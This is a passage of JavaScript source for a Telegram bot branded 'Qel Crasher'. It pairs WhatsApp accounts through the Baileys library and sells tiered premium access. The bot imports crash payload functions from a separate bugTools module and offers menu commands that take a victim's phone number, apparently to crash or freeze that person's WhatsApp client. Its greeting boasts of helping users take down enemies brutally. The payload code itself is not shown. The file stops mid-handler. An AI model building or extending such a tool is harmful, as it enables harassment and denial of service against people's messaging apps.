const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const {
  InVisibleX,
  IMGCRL,
  potterinvis,
  callNewsletter,
  crashNewsletter,
  VcardXFc,
  XdelayTrash,
  LocaBetanew2,
  BetaUI,
  CrashXUiKiller,
  InVisiOneMess,
  XProto3V2,
  crashUiV5,
  VampDelayCrash,
  frezui,
  CrashPayloadNew,
  btnStatus,
  NewsletterZap,
  splashpayment,
  xatanicaldelayv2,
  CursorimgDoc
} = require("./bugTools.js");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "✅" : "❌",
    supervip: isSupervip(userId) ? "✅" : "❌"
  };
}
//msg.key.id
//start key//
function generateRandomKey(length = 12) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return "qel_crasher:" + result;
}

//end key//
function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

//function group only
bot.on('message', (msg) => {
  const chatType = msg.chat.type;
if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
    parse_mode: 'Markdown'
  });
}

});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
        \`\`\`
╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
        \`\`\`
╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
            \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
║  𝐂𝐎𝐃𝐄 : ${formattedCode}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//definisi bot token dari file config.js
const { BOT_TOKEN } = require("./config.js");

// BUG FUNCTION SECTION
// TARO FUNCT COLONGAN MU DISINI 🤭



// MENU COMMAND SECTION
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  //ganti link foto dan musik dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
      parse_mode: 'Markdown'
    });
  }
  await bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
    caption: `
\`\`\`
( 🦋 ) - 안녕 𝗢𝗹𝗮𝗮 ${msg.from.username}!
─ 나는 𝔔𝔢𝔩 ℭ𝔯𝔞𝔰𝔥𝔢𝔯 입니다. 나는 당신이 잔혹한 방법으로 적을 쓰러뜨리는 것을 돕기 위해 왔습니다.

╭━━━⭓「 𝐂𝐑𝐀𝐒𝐇𝐄𝐑  」
║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : Qel
┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 : Qel Crasher
║ ◇ 𝐔𝐒𝐄𝐑 : ${msg.from.username}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
┃ ◇ 𝐋𝐀𝐍𝐆𝐔𝐀𝐆𝐄 : 𝐉𝐀𝐕𝐀𝐒𝐂𝐑𝐈𝐏𝐓
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 」", callback_data: "bug_menu" },
          { text: "「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」", callback_data: "owner_menu" },
        ],
      ],
    },
  });
});

bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const { premium, supervip } = badge(userId);
  bot.answerCallbackQuery(callbackQuery.id);
    //ganti link foto dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
  if (data === "bug_menu") {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
        caption: `
\`\`\`
╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
║ ◇ 𝐔𝐒𝐄𝐑      : ${callbackQuery.from.username}
┃ ◇ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 : ${premium}
║ ◇ 𝐒𝐔𝐏𝐄𝐑𝐕𝐈𝐏 : ${supervip}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
╰━━━━━━━━━━━━━━━━━━⭓
╭━━━⭓「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 ° 」
┃◇ /voxstromvip 62xxxx  
┗─⊱
┃◇ /invisiblevip 62xxx
┗─⊱ 
┃◇ /uisystem 62xxx
┗─⊱ 
┃◇ /trashervip 62xxx   
┗─⊱ 
╰━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        parse_mode: "MarkdownV2",
        reply_markup: {
          inline_keyboard: [[{ text: "「 𝐁͢𝐀͡𝐂⍣𝐊 」", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "owner_menu") {
   if (!isOwner(userId)) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: "🚫 Akses ditolak. Hanya untuk Owner.", show_alert: true });
  }
  //ganti link foto dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
        caption: `
\`\`\`
╔─═─═⪩「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」
│ ┏─⊱ Ola @${callbackQuery.from.username}! 
║ ▢ /addbot <ᴘᴀɪʀɪɴɢ>
║ ▢ /setcd <ᴅᴇᴛɪᴋ> 
║ ▢ /grouponly <ᴏɴ/ᴏꜰꜰ>
│ ▢ /listbot
║ ▢ /addsvip <ɪᴅ> <ᴅᴀʏs>
│ ▢ /delsvip <ɪᴅ> <ᴅᴀʏs>
║ ▢ /listsvip 
│ ▢ /addprem <ɪᴅ> <ᴅᴀʏs>
║ ▢ /delprem <ɪᴅ> <ᴅᴀʏs>
│ ▢ /listprem 
║ ┗─⊱
╚─═─═─═─═─═─═─═⪩
\`\`\`
`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "「 𝐁͢𝐀͡𝐂⍣𝐊 」", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "start_menu") {
    const username = callbackQuery.from.username || "Unknown";
    const message = callbackQuery.message;
  //ganti link foto dan musik dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
    if (message) {
      bot.deleteMessage(chatId, message.message_id).then(() => {
        bot.sendPhoto(chatId, "https://files.catbox.moe/ur2fnq.jpg", {
          caption: `
\`\`\`
( 🦋 ) - 안녕 𝗢𝗹𝗮𝗮 ${username}!
─ 나는 𝔔𝔢𝔩 ℭ𝔯𝔞𝔰𝔥𝔢𝔯 입니다. 나는 당신이 잔혹한 방법으로 적을 쓰러뜨리는 것을 돕기 위해 왔습니다.

╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : Qel 
┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 :  Qel Crasher
║ ◇ 𝐔𝐒𝐄𝐑 : ${username}
┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
┃ ◇ 𝐋𝐀𝐍𝐆𝐔𝐀𝐆𝐄 : 𝐉𝐀𝐕𝐀𝐒𝐂𝐑𝐈𝐏𝐓
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
          `.trim(),
          parse_mode: "MarkdownV2",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "「 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 」", callback_data: "bug_menu" },
                { text: "「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」", callback_data: "owner_menu" },
              ],
            ],
          },
        });
      });
    }
  } 
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
const supervipFile = path.resolve("./supervip_users.js");
let supervipUsers = require("./supervip_users.js");

function isSupervip(userId) {
  const user = supervipUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    supervipUsers = supervipUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(supervipFile, `const supervipUsers = ${JSON.stringify(supervipUsers, null, 2)};`);
    return false; 
  }
  return true; 
}

bot.onText(/\/addsvip(?:\s+(\d+))?\s+(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa menambahkan SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example: /addsvip <id> <durasi>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const durationDays = parseInt(match[2]);

  if (!newUserId || isNaN(durationDays) || durationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau durasi tidak valid.");
  }

  const expirationTime = Date.now() + durationDays * 24 * 60 * 60 * 1000; 

  if (supervipUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah terdaftar sebagai SVIP.");
  }

  supervipUsers.push({ id: newUserId, expiresAt: expirationTime });

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip dengan kedaluwarsa ${durationDays} hari.`
    );
  });
});

bot.onText(/\/delsvip(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa hapus SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delsvip <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");
  const userIndex = supervipUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan dalam daftar SVIP.");
  }
  supervipUsers.splice(userIndex, 1);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listsvip/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!*\nHanya OWNER yang bisa lihat daftar SVIP.",
      { parse_mode: "Markdown" }
    );
  }

  const validSupervipUsers = supervipUsers.filter(user => user.expiresAt > Date.now());

  if (!validSupervipUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar SVIP kosong.");
  }

  const svipList = validSupervipUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    ` *LIST SUPER VIP USER :*\n\`\`\`\n${svipList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});


const premiumFile = path.resolve("./premium_users.js");
let premiumUsers = require("./premium_users.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}

bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* ONLY OWNER & SVIP !.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa hapus premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/^\/createkey (\d+)$/, (msg, match) => {
  const chatId = msg.chat.id;
  const days = parseInt(match[1]);

  if (isNaN(days) || days < 1) {
    return bot.sendMessage(chatId, "❌ Masukkan bilangan hari yang sah!\nContoh: /createkey 3");
  }

  const filePath = path.join(__dirname, "keys.json");
  let keys = fs.existsSync(filePath) ? JSON.parse(fs.readFileSync(filePath)) : [];

  // Generate unique key
  let keyName;
  do {
    keyName = generateRandomKey();
  } while (keys.find(k => k.key === keyName)); // pastikan tak duplikat

  const expiresAt = new Date(Date.now() + days * 24 * 60 * 60 * 1000);

  keys.push({
    key: keyName,
    expires: expiresAt.toISOString()
  });

  fs.writeFileSync(filePath, JSON.stringify(keys, null, 2));

  bot.sendMessage(chatId, `✅ Key berjaya dicipta!\n\n🔑 *Key:*\n\`${keyName}\`\n📅 *Tamat:*\n${expiresAt.toISOString().split('T')[0]}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/^\/listkeys$/, (msg) => {
  const chatId = msg.chat.id;
  const filePath = path.join(__dirname, "keys.json");

  if (!fs.existsSync(filePath)) {
    return bot.sendMessage(chatId, "📭 Tiada key dijumpai.");
  }

  const keys = JSON.parse(fs.readFileSync(filePath));
  if (keys.length === 0) {
    return bot.sendMessage(chatId, "📭 Senarai key kosong.");
  }

  const now = new Date();
  let response = "📋 *Senarai Key Yang Ada:*\n\n";

  keys.forEach((item, index) => {
    const exp = new Date(item.expires);
    const expired = exp < now ? "❌ Tamat" : "✅ Aktif";
    response += `${index + 1}. \`${item.key}\`\n📅 Tamat: ${exp.toISOString().split('T')[0]} ${expired}\n\n`;
  });

  bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
});

bot.onText(/^\/deletekey (.+)$/, (msg, match) => {
  const chatId = msg.chat.id;
  const keyToDelete = match[1].trim();
  const filePath = path.join(__dirname, "keys.json");

  if (!fs.existsSync(filePath)) {
    return bot.sendMessage(chatId, "📭 Tiada key untuk dipadam.");
  }

  let keys = JSON.parse(fs.readFileSync(filePath));
  const initialLength = keys.length;

  keys = keys.filter(k => k.key !== keyToDelete);

  if (keys.length === initialLength) {
    return bot.sendMessage(chatId, "❌ Key tidak dijumpai.");
  }

  fs.writeFileSync(filePath, JSON.stringify(keys, null, 2));
  bot.sendMessage(chatId, `✅ Key \`${keyToDelete}\` berjaya dipadam.`, { parse_mode: "Markdown" });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar pengguna premium kosong.");
  }

  const premiumList = premiumUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
    `📋 *LIST PREMIUM USER :*\n\`\`\`\n${premiumList}\n\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!.* ONLY OWNER & SVIP !.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/grouponly (on|off)$/i, (msg, match) => {
